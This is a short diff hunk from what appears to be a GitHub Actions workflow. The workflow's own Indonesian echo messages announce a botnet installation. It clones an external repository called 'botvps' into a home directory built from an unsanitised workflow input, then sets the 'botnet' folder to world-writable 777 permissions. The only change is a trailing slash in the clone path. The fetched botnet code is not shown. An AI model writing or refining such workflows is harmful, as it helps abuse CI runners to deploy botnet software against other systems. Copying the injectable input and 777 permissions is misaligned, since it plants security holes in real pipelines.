@@ -136,7 +136,7 @@ jobs:
           echo "=================================="
           echo "PENGINSTALAN BOTNET SEDANG DI PROSES⚡⚡🌀"
           echo "=================================="
-          sudo git clone https://github.com/andikapwk123/botvps.git /home/${{ github.event.inputs.user_name }}/
+          sudo git clone https://github.com/andikapwk123/botvps.git /home/${{ github.event.inputs.user_name }}
           sudo chmod 777 /home/${{ github.event.inputs.user_name }}/botnet
           
           echo "=================================="
